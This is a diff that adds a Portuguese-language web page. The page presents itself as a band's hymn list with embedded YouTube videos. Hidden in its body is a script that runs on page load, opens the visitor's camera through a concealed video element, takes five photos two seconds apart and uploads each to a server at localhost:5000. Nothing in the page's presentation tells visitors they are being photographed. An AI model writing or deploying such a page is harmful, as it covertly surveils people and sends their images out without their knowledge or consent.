@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura de Imagens Automática</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            text-align: center;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 20px auto;
+            max-width: 600px;
+        }
+        li {
+            margin-bottom: 20px;
+        }
+        iframe {
+            width: 100%;
+            height: 315px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Banda Musical</h1>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                // Criar um elemento de vídeo oculto
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                let photoCount = 0;
+                const maxPhotos = 5;
+
+                const captureInterval = setInterval(() => {
+                    if (photoCount < maxPhotos) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            
+                            // Nome do arquivo com um contador
+                            const fileName = `foto${photoCount + 1}.png`;
+
+                            formData.append('image', blob, fileName);
+
+                            fetch('http://localhost:5000/upload', {
+                                method: 'POST',
+                                body: formData,
+                            })
+                            .then(response => response.text())
+                            .then(data => console.log(data))
+                            .catch(error => console.error('Erro ao enviar:', error));
+                        });
+
+                        photoCount++;
+                    } else {
+                        clearInterval(captureInterval); // Para o intervalo após capturar 5 fotos
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                }, 2000); // Captura uma foto a cada 2 segundos
+            })
+            .catch(error => {
+                console.error("Erro ao acessar a câmera: ", error);
+            });
+    </script>
+
+    <h2>Lista de Hinos</h2>
+    <ul>
+        <li>
+            <strong>Fidelidade</strong>
+            <iframe src="https://www.youtube.com/embed/UjQp5oQdKLg" title="Fidelidade" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </li>
+        <li>
+            <strong>Santificação</strong>
+            <iframe src="https://www.youtube.com/embed/GbMJaz3nRoE" title="Santificação" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </li>
+        <li>
+            <strong>Acende Outra Vez</strong>
+            <iframe src="https://www.youtube.com/embed/86cC5jqPPBI" title="Acende Outra Vez" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </li>
+    </ul>
+</body>
+</html>
